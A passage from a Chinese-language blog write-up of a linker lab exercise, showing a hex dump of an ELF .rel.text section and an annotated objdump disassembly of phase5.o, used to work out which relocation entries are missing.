<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">000006</span>D0   <span class="number">64</span> <span class="number">65</span> <span class="number">00</span> <span class="number">73</span>  <span class="number">74</span> <span class="number">72</span> <span class="number">6</span>C <span class="number">65</span>  <span class="number">6</span>E <span class="number">00</span> <span class="number">64</span> <span class="number">6F</span>  <span class="number">5F</span> <span class="number">70</span> <span class="number">68</span> <span class="number">61</span>  de.<span class="built_in">strlen</span>.do_pha</span><br><span class="line"><span class="number">000006E0</span>   <span class="number">73</span> <span class="number">65</span> <span class="number">00</span> <span class="number">70</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">73</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  se.<span class="built_in">puts</span>.........</span><br><span class="line"><span class="number">000006F</span>0   <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1B</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000700</span>   <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000710</span>   <span class="number">4</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">5</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span>  L.......].......</span><br><span class="line"><span class="number">00000720</span>   <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">7</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span>  ........~.......</span><br></pre></td></tr></table></figure>
<p>可以发现一个规律，对应 ‘.rel.text’ 表中：</p>
<ul>
<li>第一个4字节空间是偏移量</li>
<li>第二个4字节空间是信息（注意小端字节序）</li>
</ul>
<p>在“0x6e8”和“0x6e8+0x4”的位置是空的，’.rel.text’ 表中空着的地方都没有数据，通过前面几个实验的观察，’.rel.text’ 表是不应该存在空数据的，所以实验五的核心就是为了把 ‘.rel.text’ 表补全</p>
<p>那么填入什么数据呢，需要在汇编中查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l5] objdump -d phase5.o</span><br><span class="line"></span><br><span class="line">phase5.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;transform_code&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">   <span class="number">1</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">   <span class="number">3</span>:	e8 fc ff ff ff       	call   <span class="number">4</span> &lt;transform_code+<span class="number">0x4</span>&gt; <span class="comment">// target 0x4</span></span><br><span class="line">   <span class="number">8</span>:	<span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	add    $<span class="number">0x1</span>,%eax <span class="comment">// _GLOBAL_OFFSET_TABLE_</span></span><br><span class="line">   d:	<span class="number">8b</span> <span class="number">55</span> <span class="number">0</span>c             	mov    <span class="number">0xc</span>(%ebp),%edx</span><br><span class="line">  <span class="number">10</span>:	<span class="number">8b</span> <span class="number">94</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	mov    <span class="number">0x0</span>(%eax,%edx,<span class="number">4</span>),%edx <span class="comment">// CmhNnM</span></span><br><span class="line">  <span class="number">17</span>:	<span class="number">83</span> e2 <span class="number">07</span>             	<span class="keyword">and</span>    $<span class="number">0x7</span>,%edx</span><br><span class="line">  <span class="number">1</span>a:	<span class="number">83</span> fa <span class="number">07</span>             	cmp    $<span class="number">0x7</span>,%edx</span><br><span class="line">  <span class="number">1</span>d:	<span class="number">77</span> <span class="number">68</span>                	ja     <span class="number">87</span> &lt;.L2&gt;</span><br><span class="line">  <span class="number">1f</span>:	c1 e2 <span class="number">02</span>             	shl    $<span class="number">0x2</span>,%edx</span><br><span class="line">  <span class="number">22</span>:	<span class="number">8b</span> <span class="number">94</span> <span class="number">02</span> c0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	mov    <span class="number">0xc0</span>(%edx,%eax,<span class="number">1</span>),%edx <span class="comment">// target 0x25</span></span><br><span class="line">  <span class="number">29</span>:	<span class="number">01</span> c2                	add    %eax,%edx</span><br><span class="line">  <span class="number">2b</span>:	ff e2                	jmp    *%edx</span><br><span class="line"></span><br><span class="line"><span class="number">0000002</span>d &lt;.L3&gt;:</span><br><span class="line">  <span class="number">2</span>d:	f7 <span class="number">55</span> <span class="number">08</span>             	notl   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">30</span>:	eb <span class="number">59</span>                	jmp    <span class="number">8b</span> &lt;.L2+<span class="number">0x4</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00000032</span> &lt;.L5&gt;:</span><br><span class="line">  <span class="number">32</span>:	<span class="number">8b</span> <span class="number">55</span> <span class="number">0</span>c             	mov    <span class="number">0xc</span>(%ebp),%edx</span><br><span class="line">  <span class="number">35</span>:	<span class="number">8b</span> <span class="number">84</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	mov    <span class="number">0x0</span>(%eax,%edx,<span class="number">4</span>),%eax <span class="comment">// target 0x38</span></span><br><span class="line">  <span class="number">3</span>c:	<span class="number">83</span> e0 <span class="number">03</span>             	<span class="keyword">and</span>    $<span class="number">0x3</span>,%eax</span><br><span class="line">  <span class="number">3f</span>:	<span class="number">89</span> c1                	mov    %eax,%ecx</span><br><span class="line">  <span class="number">41</span>:	d3 <span class="number">7</span>d <span class="number">08</span>             	sarl   %cl,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">44</span>:	eb <span class="number">45</span>                	jmp    <span class="number">8b</span> &lt;.L2+<span class="number">0x4</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00000046</span> &lt;.L6&gt;:</span><br><span class="line">  <span class="number">46</span>:	<span class="number">8b</span> <span class="number">55</span> <span class="number">0</span>c             	mov    <span class="number">0xc</span>(%ebp),%edx</span><br><span class="line">  <span class="number">49</span>:	<span class="number">8b</span> <span class="number">84</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	mov    <span class="number">0x0</span>(%eax,%edx,<span class="number">4</span>),%eax <span class="comment">// CmhNnM</span></span><br><span class="line">  <span class="number">50</span>:	f7 d0                	<span class="keyword">not</span>    %eax</span><br><span class="line">  <span class="number">52</span>:	<span class="number">21</span> <span class="number">45</span> <span class="number">08</span>             	<span class="keyword">and</span>    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">55</span>:	eb <span class="number">34</span>                	jmp    <span class="number">8b</span> &lt;.L2+<span class="number">0x4</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00000057</span> &lt;.L7&gt;:</span><br><span class="line">  <span class="number">57</span>:	<span class="number">8b</span> <span class="number">55</span> <span class="number">0</span>c             	mov    <span class="number">0xc</span>(%ebp),%edx</span><br><span class="line">  <span class="number">5</span>a:	<span class="number">8b</span> <span class="number">84</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	mov    <span class="number">0x0</span>(%eax,%edx,<span class="number">4</span>),%eax <span class="comment">// CmhNnM</span></span><br><span class="line">  <span class="number">61</span>:	c1 e0 <span class="number">08</span>             	shl    $<span class="number">0x8</span>,%eax</span><br><span class="line">  <span class="number">64</span>:	<span class="number">09</span> <span class="number">45</span> <span class="number">08</span>             	<span class="keyword">or</span>     %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">67</span>:	eb <span class="number">22</span>                	jmp    <span class="number">8b</span> &lt;.L2+<span class="number">0x4</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00000069</span> &lt;.L8&gt;:</span><br><span class="line">  <span class="number">69</span>:	<span class="number">8b</span> <span class="number">55</span> <span class="number">0</span>c             	mov    <span class="number">0xc</span>(%ebp),%edx</span><br><span class="line">  <span class="number">6</span>c:	<span class="number">8b</span> <span class="number">84</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	mov    <span class="number">0x0</span>(%eax,%edx,<span class="number">4</span>),%eax <span class="comment">// target 0x6f</span></span><br><span class="line">  <span class="number">73</span>:	<span class="number">31</span> <span class="number">45</span> <span class="number">08</span>             	<span class="keyword">xor</span>    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">76</span>:	eb <span class="number">13</span>                	jmp    <span class="number">8b</span> &lt;.L2+<span class="number">0x4</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00000078</span> &lt;.L9&gt;:</span><br><span class="line">  <span class="number">78</span>:	<span class="number">8b</span> <span class="number">55</span> <span class="number">0</span>c             	mov    <span class="number">0xc</span>(%ebp),%edx</span><br><span class="line">  <span class="number">7b</span>:	<span class="number">8b</span> <span class="number">84</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	mov    <span class="number">0x0</span>(%eax,%edx,<span class="number">4</span>),%eax <span class="comment">// CmhNnM</span></span><br><span class="line">  <span class="number">82</span>:	<span class="number">89</span> <span class="number">45</span> <span class="number">08</span>             	mov    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">85</span>:	eb <span class="number">04</span>                	jmp    <span class="number">8b</span> &lt;.L2+<span class="number">0x4</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00000087</span> &lt;.L2&gt;:</span><br><span class="line">  <span class="number">87</span>:	f7 <span class="number">5</span>d <span class="number">08</span>             	negl   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">8</span>a:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">8b</span>:	<span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             	mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line">  <span class="number">8</span>e:	<span class="number">5</span>d                   	pop    %ebp</span><br><span class="line">  <span class="number">8f</span>:	c3                   	ret    </span><br><span class="line"></span><br><span class="line"><span class="number">00000090</span> &lt;generate_code&gt;:</span><br><span class="line">  <span class="number">90</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">  <span class="number">91</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">  <span class="number">93</span>:	<span class="number">53</span>                   	push   %ebx</span><br><span class="line">  <span class="number">94</span>:	<span class="number">83</span> ec <span class="number">10</span>             	sub    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">97</span>:	e8 fc ff ff ff       	call   <span class="number">98</span> &lt;generate_code+<span class="number">0x8</span>&gt; <span class="comment">// target 0x98</span></span><br><span class="line">  <span class="number">9</span>c:	<span class="number">81</span> c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	add    $<span class="number">0x2</span>,%ebx <span class="comment">// _GLOBAL_OFFSET_TABLE_</span></span><br><span class="line">  a2:	<span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             	mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line">  a5:	<span class="number">88</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	mov    %al,<span class="number">0x0</span>(%ebx) <span class="comment">// CODE</span></span><br><span class="line">  ab:	c7 <span class="number">45</span> f8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movl   $<span class="number">0x0</span>,<span class="number">-0x8</span>(%ebp) <span class="comment">// target 0xae</span></span><br><span class="line">  b2:	eb <span class="number">20</span>                	jmp    d4 &lt;generate_code+<span class="number">0x44</span>&gt;</span><br><span class="line">  b4:	<span class="number">0f</span> b6 <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movzbl <span class="number">0x0</span>(%ebx),%eax <span class="comment">// target 0xb7</span></span><br><span class="line">  bb:	<span class="number">0f</span> be c0             	movsbl %al,%eax</span><br><span class="line">  be:	ff <span class="number">75</span> f8             	pushl  <span class="number">-0x8</span>(%ebp)</span><br><span class="line">  c1:	<span class="number">50</span>                   	push   %eax</span><br><span class="line">  c2:	e8 fc ff ff ff       	call   c3 &lt;generate_code+<span class="number">0x33</span>&gt;</span><br><span class="line">  c7:	<span class="number">83</span> c4 <span class="number">08</span>             	add    $<span class="number">0x8</span>,%esp</span><br><span class="line">  ca:	<span class="number">88</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	mov    %al,<span class="number">0x0</span>(%ebx) <span class="comment">// CODE</span></span><br><span class="line">  d0:	<span class="number">83</span> <span class="number">45</span> f8 <span class="number">01</span>          	addl   $<span class="number">0x1</span>,<span class="number">-0x8</span>(%ebp)</span><br><span class="line">  d4:	<span class="number">8b</span> <span class="number">45</span> f8             	mov    <span class="number">-0x8</span>(%ebp),%eax</span><br><span class="line">  d7:	<span class="number">83</span> f8 <span class="number">08</span>             	cmp    $<span class="number">0x8</span>,%eax</span><br><span class="line">  da:	<span class="number">76</span> d8                	jbe    b4 &lt;generate_code+<span class="number">0x24</span>&gt;</span><br><span class="line">  dc:	<span class="number">90</span>                   	nop</span><br><span class="line">  dd:	<span class="number">8b</span> <span class="number">5</span>d fc             	mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line">  e0:	c9                   	leave  </span><br><span class="line">  e1:	c3                   	ret    </span><br><span class="line"></span><br><span class="line"><span class="number">000000e2</span> &lt;encode&gt;:</span><br><span class="line">  e2:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">  e3:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">  e5:	<span class="number">53</span>                   	push   %ebx</span><br><span class="line">  e6:	<span class="number">83</span> ec <span class="number">14</span>             	sub    $<span class="number">0x14</span>,%esp</span><br><span class="line">  e9:	e8 fc ff ff ff       	call   ea &lt;encode+<span class="number">0x8</span>&gt; <span class="comment">// __x86.get_pc_thunk.bx</span></span><br><span class="line">  ee:	<span class="number">81</span> c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	add    $<span class="number">0x2</span>,%ebx <span class="comment">// target 0xf0</span></span><br><span class="line">  f4:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">  f7:	ff <span class="number">75</span> <span class="number">08</span>             	pushl  <span class="number">0x8</span>(%ebp)</span><br><span class="line">  fa:	e8 fc ff ff ff       	call   fb &lt;encode+<span class="number">0x19</span>&gt; <span class="comment">// strlen</span></span><br><span class="line">  ff:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">102</span>:	<span class="number">89</span> <span class="number">45</span> f4             	mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">105</span>:	c7 <span class="number">45</span> f0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movl   $<span class="number">0x0</span>,<span class="number">-0x10</span>(%ebp) </span><br><span class="line"> <span class="number">10</span>c:	eb <span class="number">5</span>d                	jmp    <span class="number">16b</span> &lt;encode+<span class="number">0x89</span>&gt;</span><br><span class="line"> <span class="number">10</span>e:	<span class="number">8b</span> <span class="number">55</span> f0             	mov    <span class="number">-0x10</span>(%ebp),%edx</span><br><span class="line"> <span class="number">111</span>:	<span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             	mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line"> <span class="number">114</span>:	<span class="number">01</span> d0                	add    %edx,%eax</span><br><span class="line"> <span class="number">116</span>:	<span class="number">0f</span> b6 <span class="number">00</span>             	movzbl (%eax),%eax</span><br><span class="line"> <span class="number">119</span>:	<span class="number">0f</span> be c0             	movsbl %al,%eax</span><br><span class="line"> <span class="number">11</span>c:	<span class="number">0f</span> b6 <span class="number">94</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movzbl <span class="number">0x0</span>(%ebx,%eax,<span class="number">1</span>),%edx <span class="comment">// cRvFVR</span></span><br><span class="line"> <span class="number">123</span>:	<span class="number">00</span> </span><br><span class="line"> <span class="number">124</span>:	<span class="number">0f</span> b6 <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movzbl <span class="number">0x0</span>(%ebx),%eax <span class="comment">// CODE</span></span><br><span class="line"> <span class="number">12b</span>:	<span class="number">89</span> d1                	mov    %edx,%ecx</span><br><span class="line"> <span class="number">12</span>d:	<span class="number">31</span> c1                	<span class="keyword">xor</span>    %eax,%ecx</span><br><span class="line"> <span class="number">12f</span>:	<span class="number">8b</span> <span class="number">55</span> f0             	mov    <span class="number">-0x10</span>(%ebp),%edx</span><br><span class="line"> <span class="number">132</span>:	<span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             	mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line"> <span class="number">135</span>:	<span class="number">01</span> d0                	add    %edx,%eax</span><br><span class="line"> <span class="number">137</span>:	<span class="number">83</span> e1 <span class="number">7f</span>             	<span class="keyword">and</span>    $<span class="number">0x7f</span>,%ecx</span><br><span class="line"> <span class="number">13</span>a:	<span class="number">89</span> ca                	mov    %ecx,%edx</span><br><span class="line"> <span class="number">13</span>c:	<span class="number">88</span> <span class="number">10</span>                	mov    %dl,(%eax)</span><br><span class="line"> <span class="number">13</span>e:	<span class="number">8b</span> <span class="number">55</span> f0             	mov    <span class="number">-0x10</span>(%ebp),%edx</span><br><span class="line"> <span class="number">141</span>:	<span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             	mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line"> <span class="number">144</span>:	<span class="number">01</span> d0                	add    %edx,%eax</span><br><span class="line"> <span class="number">146</span>:	<span class="number">0f</span> b6 <span class="number">00</span>             	movzbl (%eax),%eax</span><br><span class="line"> <span class="number">149</span>:	<span class="number">3</span>c <span class="number">1f</span>                	cmp    $<span class="number">0x1f</span>,%al</span><br><span class="line"> <span class="number">14b</span>:	<span class="number">7</span>e <span class="number">0f</span>                	jle    <span class="number">15</span>c &lt;encode+<span class="number">0x7a</span>&gt;</span><br><span class="line"> <span class="number">14</span>d:	<span class="number">8b</span> <span class="number">55</span> f0             	mov    <span class="number">-0x10</span>(%ebp),%edx</span><br><span class="line"> <span class="number">150</span>:	<span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             	mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line"> <span class="number">153</span>:	<span class="number">01</span> d0                	add    %edx,%eax</span><br><span class="line"> <span class="number">155</span>:	<span class="number">0f</span> b6 <span class="number">00</span>             	movzbl (%eax),%eax</span><br><span class="line"> <span class="number">158</span>:	<span class="number">3</span>c <span class="number">7f</span>                	cmp    $<span class="number">0x7f</span>,%al</span><br><span class="line"> <span class="number">15</span>a:	<span class="number">75</span> <span class="number">0b</span>                	jne    <span class="number">167</span> &lt;encode+<span class="number">0x85</span>&gt;</span><br><span class="line"> <span class="number">15</span>c:	<span class="number">8b</span> <span class="number">55</span> f0             	mov    <span class="number">-0x10</span>(%ebp),%edx</span><br><span class="line"> <span class="number">15f</span>:	<span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             	mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line"> <span class="number">162</span>:	<span class="number">01</span> d0                	add    %edx,%eax</span><br><span class="line"> <span class="number">164</span>:	c6 <span class="number">00</span> <span class="number">20</span>             	movb   $<span class="number">0x20</span>,(%eax)</span><br><span class="line"> <span class="number">167</span>:	<span class="number">83</span> <span class="number">45</span> f0 <span class="number">01</span>          	addl   $<span class="number">0x1</span>,<span class="number">-0x10</span>(%ebp)</span><br><span class="line"> <span class="number">16b</span>:	<span class="number">8b</span> <span class="number">45</span> f0             	mov    <span class="number">-0x10</span>(%ebp),%eax</span><br><span class="line"> <span class="number">16</span>e:	<span class="number">3b</span> <span class="number">45</span> f4             	cmp    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">171</span>:	<span class="number">7</span>c <span class="number">9b</span>                	jl     <span class="number">10</span>e &lt;encode+<span class="number">0x2c</span>&gt;</span><br><span class="line"> <span class="number">173</span>:	<span class="number">8b</span> <span class="number">45</span> f4             	mov    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">176</span>:	<span class="number">8b</span> <span class="number">5</span>d fc             	mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line"> <span class="number">179</span>:	c9                   	leave  </span><br><span class="line"> <span class="number">17</span>a:	c3                   	ret    </span><br><span class="line"></span><br><span class="line"><span class="number">0000017b</span> &lt;do_phase&gt;:</span><br><span class="line"> <span class="number">17b</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line"> <span class="number">17</span>c:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line"> <span class="number">17</span>e:	<span class="number">53</span>                   	push   %ebx</span><br><span class="line"> <span class="number">17f</span>:	<span class="number">83</span> ec <span class="number">04</span>             	sub    $<span class="number">0x4</span>,%esp</span><br><span class="line"> <span class="number">182</span>:	e8 fc ff ff ff       	call   <span class="number">183</span> &lt;do_phase+<span class="number">0x8</span>&gt; <span class="comment">// target 0x183</span></span><br><span class="line"> <span class="number">187</span>:	<span class="number">81</span> c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	add    $<span class="number">0x2</span>,%ebx <span class="comment">// _GLOBAL_OFFSET_TABLE_</span></span><br><span class="line"> <span class="number">18</span>d:	<span class="number">68</span> <span class="number">87</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	push   $<span class="number">0x87</span></span><br><span class="line"> <span class="number">192</span>:	e8 fc ff ff ff       	call   <span class="number">193</span> &lt;do_phase+<span class="number">0x18</span>&gt; <span class="comment">// generate_code</span></span><br><span class="line"> <span class="number">197</span>:	<span class="number">83</span> c4 <span class="number">04</span>             	add    $<span class="number">0x4</span>,%esp</span><br><span class="line"> <span class="number">19</span>a:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    $<span class="number">0xc</span>,%esp</span><br><span class="line"> <span class="number">19</span>d:	<span class="number">8</span>d <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	lea    <span class="number">0x0</span>(%ebx),%eax <span class="comment">// BUF</span></span><br><span class="line"> <span class="number">1</span>a3:	<span class="number">50</span>                   	push   %eax</span><br><span class="line"> <span class="number">1</span>a4:	e8 fc ff ff ff       	call   <span class="number">1</span>a5 &lt;do_phase+<span class="number">0x2a</span>&gt; <span class="comment">// encode</span></span><br><span class="line"> <span class="number">1</span>a9:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">1</span>ac:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    $<span class="number">0xc</span>,%esp</span><br><span class="line"> <span class="number">1</span>af:	<span class="number">8</span>d <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	lea    <span class="number">0x0</span>(%ebx),%eax <span class="comment">// BUF</span></span><br><span class="line"> <span class="number">1b</span>5:	<span class="number">50</span>                   	push   %eax</span><br><span class="line"> <span class="number">1b</span>6:	e8 fc ff ff ff       	call   <span class="number">1b</span>7 &lt;do_phase+<span class="number">0x3c</span>&gt; <span class="comment">// puts</span></span><br><span class="line"> <span class="number">1b</span>b:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">1b</span>e:	<span class="number">90</span>                   	nop</span><br><span class="line"> <span class="number">1b</span>f:	<span class="number">8b</span> <span class="number">5</span>d fc             	mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line"> <span class="number">1</span>c2:	c9                   	leave  </span><br><span class="line"> <span class="number">1</span>c3:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">8b</span> <span class="number">04</span> <span class="number">24</span>             	mov    (%esp),%eax</span><br><span class="line">   <span class="number">3</span>:	c3                   	